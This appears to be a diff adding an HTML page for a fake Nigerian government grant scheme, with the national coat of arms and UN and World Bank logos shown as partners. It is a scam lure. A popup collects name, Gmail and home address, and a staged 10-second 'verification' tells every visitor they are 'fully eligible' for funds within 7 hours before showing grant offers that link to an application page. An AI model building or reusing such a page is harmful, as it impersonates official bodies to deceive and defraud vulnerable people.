@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Government Grant Program</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(120deg, #0f2027, #203a43, #2c5364);
+    color: #fff;
+    text-align: center;
+}
+
+#mainContent {
+    display: none;
+}
+
+.section {
+    padding: 50px 20px;
+}
+
+.card {
+    background: rgba(255,255,255,0.1);
+    margin: 20px auto;
+    padding: 20px;
+    border-radius: 12px;
+    max-width: 500px;
+}
+
+.btn {
+    display: inline-block;
+    margin: 10px;
+    padding: 12px 20px;
+    background: #00c6ff;
+    color: #000;
+    border-radius: 8px;
+    text-decoration: none;
+    font-weight: bold;
+}
+
+.btn:hover {
+    background: #0072ff;
+    color: #fff;
+}
+
+/* PARTNERS */
+.partners {
+    margin-top: 40px;
+}
+
+.partner-logos {
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+    flex-wrap: wrap;
+    margin-top: 20px;
+}
+
+.partner-logos img {
+    width: 80px;
+    height: 80px;
+    object-fit: contain;
+    background: #fff;
+    padding: 10px;
+    border-radius: 10px;
+}
+
+/* POPUP */
+.popup {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.9);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.popup-box {
+    background: rgba(255,255,255,0.1);
+    backdrop-filter: blur(15px);
+    padding: 25px;
+    border-radius: 15px;
+    width: 90%;
+    max-width: 400px;
+}
+
+.logo {
+    width: 70px;
+}
+
+input {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    border-radius: 6px;
+    border: none;
+}
+
+button {
+    margin-top: 15px;
+    padding: 12px;
+    width: 100%;
+    background: #00c6ff;
+    border: none;
+    border-radius: 6px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #0072ff;
+    color: #fff;
+}
+
+/* LOADER */
+.loader {
+    border: 6px solid #eee;
+    border-top: 6px solid #00c6ff;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    margin: 20px auto;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    100% { transform: rotate(360deg); }
+}
+
+.hidden {
+    display: none;
+}
+</style>
+</head>
+
+<body>
+
+<!-- POPUP -->
+<div class="popup" id="popup">
+    <div class="popup-box">
+
+        <div id="formBox">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Coat_of_arms_of_Nigeria.svg/200px-Coat_of_arms_of_Nigeria.svg.png" class="logo">
+
+            <h2>Relief Funding Program</h2>
+            <p>This program supports citizens with business, education, and personal funding.</p>
+
+            <input type="text" id="name" placeholder="Full Name">
+            <input type="email" placeholder="Gmail Address">
+            <input type="text" placeholder="Current Address">
+
+            <button onclick="startCheck()">Check Eligibility</button>
+        </div>
+
+        <div id="loadingBox" class="hidden">
+            <h3>Verifying...</h3>
+            <div class="loader"></div>
+        </div>
+
+        <div id="resultBox" class="hidden">
+            <h2 id="resultTitle"></h2>
+            <p id="resultText"></p>
+        </div>
+
+    </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div id="mainContent">
+
+    <div class="section">
+        <h1>Available Grant Packages</h1>
+    </div>
+
+    <div class="card">
+        <h3>Small Business Support Fund</h3>
+        <p>Up to ₦1,000,000 for small businesses and startups.</p>
+        <a href="apply.html" class="btn">Apply Now</a>
+    </div>
+
+    <div class="card">
+        <h3>Education Support Grant</h3>
+        <p>Funding for tuition, training, and skill development.</p>
+        <a href="apply.html" class="btn">Continue</a>
+    </div>
+
+    <div class="card">
+        <h3>Youth Empowerment Fund</h3>
+        <p>Financial support for youth projects and entrepreneurship.</p>
+        <a href="apply.html" class="btn">Apply Now</a>
+    </div>
+
+    <div class="card">
+        <h3>Personal Relief Fund</h3>
+        <p>Emergency financial support for individuals and families.</p>
+        <a href="apply.html" class="btn">Continue</a>
+    </div>
+
+    <!-- PARTNERS SECTION -->
+    <div class="section partners">
+        <h2>Partners & Supporting Organizations</h2>
+        <p>In collaboration with trusted funding and development partners.</p>
+
+        <div class="partner-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Coat_of_arms_of_Nigeria.svg/200px-Coat_of_arms_of_Nigeria.svg.png" alt="Partner 1">
+
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Flag_of_the_United_Nations.svg/320px-Flag_of_the_United_Nations.svg.png" alt="Partner 2">
+
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/World_Bank_Group_logo.svg/320px-World_Bank_Group_logo.svg.png" alt="Partner 3">
+        </div>
+    </div>
+
+</div>
+
+<script>
+let userName = "";
+
+function startCheck() {
+    userName = document.getElementById("name").value;
+
+    if(userName === "") {
+        alert("Enter your name");
+        return;
+    }
+
+    document.getElementById("formBox").classList.add("hidden");
+    document.getElementById("loadingBox").classList.remove("hidden");
+
+    setTimeout(showResult, 10000);
+}
+
+function showResult() {
+    document.getElementById("loadingBox").classList.add("hidden");
+    document.getElementById("resultBox").classList.remove("hidden");
+
+    document.getElementById("resultTitle").innerText =
+        "Congratulations, " + userName + "!";
+
+    document.getElementById("resultText").innerText =
+        "You are fully eligible. Funds can be disbursed within 7 hours.";
+
+    setTimeout(enterSite, 5000);
+}
+
+function enterSite() {
+    document.getElementById("popup").style.display = "none";
+    document.getElementById("mainContent").style.display = "block";
+}
+</script>
+
+</body>
+</html>
